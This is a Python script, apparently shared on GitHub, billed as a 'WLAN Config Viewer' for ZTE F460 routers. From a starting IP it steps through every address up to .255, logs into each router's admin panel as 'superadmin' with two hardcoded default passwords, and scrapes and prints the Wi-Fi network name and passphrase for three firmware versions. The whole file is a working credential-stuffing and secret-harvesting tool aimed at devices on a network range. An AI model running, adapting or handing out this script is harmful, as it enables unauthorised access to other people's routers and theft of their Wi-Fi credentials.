# ZTE F460 WLAN Config Viewer
# Code by Mugi F.
# github.com/mugi789
# For donate >> saweria.co/mugifadilah
import requests
from bs4 import BeautifulSoup
from prettytable import PrettyTable
print('''
 ()()                       ____ 
 (..)      \033[31mZTE F460\033[39m        /|o  |
 /\/\  \033[31mWLAN Config Viewer\033[39m /o|  o|
c\db/o.................../o_|_o_|
''')
host = input('Input IP Gateway : ')
hitung = int(host.split('.')[3])
while hitung < 256:
    try:
        ip = '.'.join(map(str, host.split(".")[:-1]+[hitung]))
        getoken = BeautifulSoup(requests.get('http://'+ip+'/', timeout=1).content, 'html.parser')
        token = str(getoken.find_all('script')[1]).split('getObj("Frm_Logintoken").value = "')[1].split('";')[0]
        kata = {
            "suportadmin",
            "kabeliz123"
        }
        for xpw in kata:
            raw = {
            "frashnum": "",
            "action": "login",
            "Frm_Logintoken": token,
            "Username": "superadmin",
            "Password": xpw
            }
            log = requests.post('http://'+ip+'/', data=raw, allow_redirects=True, timeout=1)
            if 'http://'+ip+'/start.ghtml' == log.url:
                getver = BeautifulSoup(requests.get('http://'+ip+'/template.gch', timeout=1).content, 'html.parser')
                ver = str(getver.find('div', {'id': 'e8_div1'}).find_all('td', {'id': 'Frm_SoftwareVer'})).split('>')[1].replace('</td', '')
                if 'V6.0.0P12T6' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_essid_t.gch').text, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[98]).split('ESSID')[1].split("'")[2]
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_secrity_t.gch').text, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[21]).split('KeyPassphrase')[1].split("'")[2]
                    hasil.add_row([ip, namawifi, pswdwifi])
                    print(hasil)
                elif 'V6.0.3P1T1' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[101]).split("','")[1].replace("');</script>", "")
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[26]).split("','")[1].replace("');</script>", "")
                    hasil.add_row([ip, namawifi, pswdwifi])
                    print(hasil)
                elif 'V5.0.10P4T18' == ver:
                    hasil = PrettyTable(['IP', 'ESSID', 'PASSWORD'])
                    namawifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_essid_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[83]).split("','")[1].replace("');</script>", "")
                    pswdwifi = str(BeautifulSoup(requests.get('http://'+ip+'/getpage.gch?pid=1002&nextpage=net_wlan_secrity_t.gch').content, 'html.parser').find('div', {'id': 'e8_div1'}).find_all('script', language='javascript')[21]).split("','")[1].replace("');</script>", "")
                    hasil.add_row([ip, namawifi, pswdwifi])
                    print(hasil)
                else:
                    print(log.url+' Versi '+ver+' belum tersedia')
            else:
                pass
        hitung += 1
    except IndexError:
        print('http://'+ip+"\033[31m Error\033[39m", end='\r')
        hitung += 1
        pass
    except requests.exceptions.ConnectionError:
        print('http://'+ip+"\033[31m IP Not Found\033[39m", end='\r')
        hitung += 1
        pass
    except KeyboardInterrupt:
        print(end='\r')
        print('Bye', end='\n')
        pass
        break